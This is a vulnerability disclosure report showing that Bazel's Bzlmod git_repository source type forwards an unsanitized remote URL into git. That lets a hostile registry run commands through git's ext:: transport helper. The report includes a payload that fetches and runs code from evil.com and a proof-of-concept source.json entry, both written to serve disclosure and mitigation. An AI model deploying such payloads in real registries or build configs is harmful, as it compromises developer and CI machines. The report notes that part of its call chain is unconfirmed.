### Title
Unsanitized `remote` URL forwarded from Bzlmod registry `source.json` into `git` subprocess enables `ext::` transport-helper command execution - (File: `tools/build_defs/repo/git_worker.bzl`)

### Summary
`git_repository`/Bzlmod module resolution can source the `remote` attribute directly from an untrusted registry's `source.json` (`type: "git_repository"`) and pass it, unsanitized, into `git remote add origin <remote>` / `git fetch origin`. Unlike the `archive` (`http_archive`) source type, which carries an `integrity` hash, the `git_repository` source type has no cryptographic pinning of the transport target, so a hostile registry can supply a `remote` value using git's `ext::` transport helper (or an option-like string) to make the local `git` binary execute an arbitrary shell command on the victim's machine during dependency resolution — the same bug class as ALPINE-CVE-2018-7032 (`myrepos`/`webcheckout` failing to sanitize URLs passed to `git clone`).

### Finding Description
Bazel's Bzlmod registry protocol allows a module version's `source.json` to declare `"type": "git_repository"` with a `remote` field that is "directly forwarded to the underlying `git_repository` repo rule" [1](#0-0)  This mirrors the WORKSPACE-era `git_repository` rule's `remote` attribute, documented as "The URI of the remote Git repository" [2](#0-1)  and confirmed in the test harness helper that constructs registry entries of this type (`'type': 'git_repository', 'remote': f'file://{path}'`) [3](#0-2) .

That `remote` string flows into `git_repo(ctx, ...)`, which stores it verbatim in the `_GitRepoInfo.remote` field [4](#0-3)  and is used unmodified by `add_origin`:
`_git(ctx, git_repo, "remote", "add", "origin", remote)` [5](#0-4) , followed by `fetch(ctx, git_repo)` which invokes `git fetch origin ...` [6](#0-5) . There is no validation that `remote` uses an expected scheme (`https://`, `git://`, `ssh://`, etc.), and no rejection of git's `ext::<command>` transport helper syntax or of strings beginning with `-` that could be interpreted as options by the `git` binary. Because git natively supports `remote.<name>.vcs`/`ext::` transport helpers that spawn an arbitrary shell command specified inside the URL, an attacker who controls (or compromises/mirrors) a registry consulted via `--registry` can serve a `source.json` whose `remote` is e.g. `ext::sh -c "curl evil.com/payload|sh"`. When Bazel resolves this module, `git remote add origin ext::sh -c ...` followed by `git fetch origin` executes the attacker's command on the developer's/CI machine, exactly the "ext::sh -c" attack demonstrated in the referenced CVE for `myrepos`.

This differs from the `archive`/`http_archive` source type, where the fetched bytes are bound to a declared `integrity` hash that would cause Bazel to reject tampered content [7](#0-6) ; the `git_repository` source type carries no equivalent binding on the `remote` value itself, so nothing stops a malicious/compromised registry from injecting an arbitrary transport string.

### Impact Explanation
Arbitrary command execution on the machine running `bazel build`/`bazel fetch`, triggered purely by resolving a dependency graph that references a module backed by a hostile or compromised registry entry of `type: "git_repository"`. This is a full compromise of the build host/CI runner, not merely of the sandboxed build output, since the `git` subprocess and its `ext::` helper run outside any build sandbox during repository-fetch phase.

### Likelihood Explanation
Requires only that the victim's `--registry` list (or a mirror/CDN in front of it) serves a `source.json` of `type: "git_repository"` with a crafted `remote`. No credentials, MITM position, or access to the victim's machine/output base are needed — this matches the "hostile registry serving a module version" attacker model. The only impediment is that a) `git_repository` module sources are rarer than `archive` sources in the public BCR, and b) the registry itself (or a mirror an operator points `--registry` at) must be attacker-influenced.

### Recommendation
- Validate the `remote` value forwarded from registry `source.json` (and the `git_repository`/`new_git_repository` `remote` attribute more generally when derived from non-root-owned data) against an allowlist of URL schemes (`https`, `http`, `git`, `ssh`, `file` under controlled conditions), rejecting `ext::`, `fd::`, and any value that is not a well-formed URL.
- Reject `remote` values that could be interpreted as command-line options by `git` (e.g., values starting with `-`).
- Consider disabling risky git transport helpers (`protocol.ext.allow=never`, `protocol.allow=never` combined with an explicit allowlist) when invoking `git` from repository rules, similar to the `protocol.file.allow=always` override already used defensively for submodules [8](#0-7) .

### Proof of Concept
1. Stand up a registry (or compromise/mirror one referenced via `--registry`) containing a module version with `source.json`:
```json
{
  "type": "git_repository",
  "remote": "ext::sh -c 'touch /tmp/pwned'"
}
```
(modeled directly on the registry helper in the test suite that builds `{'type': 'git_repository', 'remote': ...}` entries) [9](#0-8) 
2. Add a `bazel_dep` on that module in `MODULE.bazel` and run `bazel build //...` with `--registry` pointed at the hostile registry.
3. Bazel resolves the module, invokes `git_repo(ctx, directory)` → `add_origin` → `_git(ctx, git_repo, "remote", "add", "origin", "ext::sh -c 'touch /tmp/pwned'")` [5](#0-4)  followed by `fetch(ctx, git_repo)` [6](#0-5) , causing git to invoke the `ext::` helper and execute the attacker's shell command, producing `/tmp/pwned` on the build host.

Note: I was unable to locate the specific Java class that parses `source.json` into a `RepoSpec` for the `git_repository` type (search for `ArchiveRepoSpecBuilder`/similar builder classes returned no results in the indexed code), so the exact Java-side call chain from registry JSON to the `git_repository` Starlark rule invocation could not be directly confirmed in this pass — this may be due to index coverage limits. The Starlark-side sink (`git_worker.bzl`) and the documented registry contract that `remote` is "directly forwarded" are confirmed, but a full JUnit/integration proof spanning the Java registry-parsing code would require further investigation, ideally with a Devin session that has full repository access.

### Citations

**File:** docs/external/registry.mdx (L53-57)
```text
        `https://example.com/mirror2/foo.com/bar/baz`, and finally the original
        source URL itself `https://foo.com/bar/baz`.
*   `module_base_path`: a string, specifying the base path for modules with
    `local_path` type in the `source.json` file

```

**File:** docs/external/registry.mdx (L105-111)
```text
*   If `type` is `git_repository`, this module version is backed by a
    [`git_repository`](/rules/lib/repo/git#git_repository) repo rule; it's
    fetched by cloning a Git repository.
    *   The following fields are supported, and are directly forwarded to the
        underlying `git_repository` repo rule: `remote`, `commit`,
        `shallow_since`, `tag`, `init_submodules`, `verbose`, and
        `strip_prefix`, `patch_strip`.
```

**File:** docs/versions/8.1.1/rules/lib/repo/git.mdx (L224-235)
```text
<tr id="git_repository-remote">
<td><code>remote</code></td>
<td>

String; required

<p>

The URI of the remote Git repository

</p>
</td>
```

**File:** src/test/py/bazel/bzlmod/test_utils.py (L402-416)
```python
  def createGitRepoModule(self, name, version, path, deps=None, **kwargs):
    """Add a git repo module into the registry."""
    module_dir = self.root.joinpath('modules', name, version)
    module_dir.mkdir(parents=True, exist_ok=True)

    # Create source.json & copy patch files to the registry
    source = {
        'type': 'git_repository',
        'remote': f'file://{path}',
    }
    source.update(**kwargs)

    self._createModuleAndSourceJson(
        module_dir, name, version, path, deps, source
    )
```

**File:** tools/build_defs/repo/git_worker.bzl (L82-90)
```text
    git_repo = _GitRepoInfo(
        directory = ctx.path(directory),
        shallow = shallow,
        reset_ref = reset_ref,
        fetch_ref = fetch_ref,
        remote = str(ctx.attr.remote),
        init_submodules = ctx.attr.init_submodules,
        recursive_init_submodules = ctx.attr.recursive_init_submodules,
    )
```

**File:** tools/build_defs/repo/git_worker.bzl (L158-159)
```text
def add_origin(ctx, git_repo, remote):
    _git(ctx, git_repo, "remote", "add", "origin", remote)
```

**File:** tools/build_defs/repo/git_worker.bzl (L161-176)
```text
def fetch(ctx, git_repo):
    args = ["fetch", "origin"]

    sparse_checkout_patterns_or_file = \
        getattr(ctx.attr, "sparse_checkout_patterns", None) or \
        getattr(ctx.attr, "sparse_checkout_file", None)
    if sparse_checkout_patterns_or_file:
        if _git_sparse_checkout_config(ctx, git_repo):
            # Use filter to disable downloading file contents until we set the `sparse-checkout` patterns.
            args.append("--filter=blob:none")
        else:
            print("WARNING: Sparse checkout is not supported. Doing a full checkout.")
            sparse_checkout_patterns_or_file = None

    args.extend(["--", git_repo.fetch_ref])
    st = _git_maybe_shallow(ctx, git_repo, *args)
```

**File:** tools/build_defs/repo/git_worker.bzl (L210-217)
```text
def update_submodules(ctx, git_repo, recursive = False):
    if recursive:
        # "protocol.file.allow=always" allows the submodule command clone from a local directory.
        # It's necessary for Git 2.38.1 and assoicated backport versions.
        # See https://github.com/bazelbuild/bazel/issues/17040
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--recursive", "--checkout", "--force")
    else:
        _git_maybe_shallow(ctx, git_repo, "-c", "protocol.file.allow=always", "submodule", "update", "--init", "--checkout", "--force")
```
